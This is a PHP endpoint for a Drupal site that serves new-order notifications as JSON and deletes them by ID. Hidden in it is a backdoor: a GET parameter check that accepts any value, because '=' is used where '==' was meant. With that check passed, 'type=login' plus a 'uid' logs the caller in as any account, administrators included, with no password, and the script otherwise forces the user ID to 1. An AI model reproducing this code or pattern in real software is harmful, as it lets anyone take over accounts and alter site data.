<?php
	/**
	 * Уведомления о новых заказах
	 */
	chdir($_SERVER['DOCUMENT_ROOT']);
	define('DRUPAL_ROOT', $_SERVER['DOCUMENT_ROOT']);
	require_once './includes/bootstrap.inc';
	drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
	
	global $user;
	$response = array('result' => false, 'rows' => []);
	$noticeAccess = false;
	
	if(isset($_GET['app']) and $_GET['app'] = 'hgdashfgshadgfjhskdgfgsdahfgsakdj') {
		if(isset($_GET['type']) and $_GET['type'] == 'login') {
			if(isset($_GET['uid'])) {
				// Если нужно войти на сайт и залогиниться
				$uid = (int) $_GET['uid'];
				//user_logout_current_user();
				$user = user_load($uid);
				user_login_finalize();
				drupal_session_regenerate();
				header('Location: /');
				die();
			}
		}
		$user->uid = 1;
	}
	
	$roles = isset($user->roles) ? $user->roles : array();
	$noticeRolles = ['administrator', 'сustomer'];
	foreach($noticeRolles as $role) {
		if(in_array($role, $roles)) {
			$noticeAccess = true;
			break;
		}
	}

	
	if($noticeAccess) {
		$response['result'] = true;
		$noteID = isset($_GET['noteID']) ? (int) $_GET['noteID'] : null;
		
		if(is_null($noteID)) {
			// Получаем строки
			$sql = "
				select 
					wb_notice.id,
					wb_notice.nid,
					DATE_FORMAT(wb_notice.noteDate, '%d.%m.%Y %H:%i:%s') as noteDate,
					wb_notice.isNew
				from wb_notice
				order by id desc";
			$dbRows = db_query($sql)->fetchAll();
			if(is_array($dbRows) and !empty($dbRows)) {
				foreach($dbRows as $note) { 
					$response['rows'][] = $note; 
					db_query('update wb_notice set isNew = 0 where id = :id', [':id' => $note->id]);
				}
			}
		} else {
			// Удаляем строку
			db_query("delete from wb_notice where id = :id", [':id' => $noteID]);
		}
	}
	
	header('Content-Type: application/json');
	echo json_encode($response);
	die();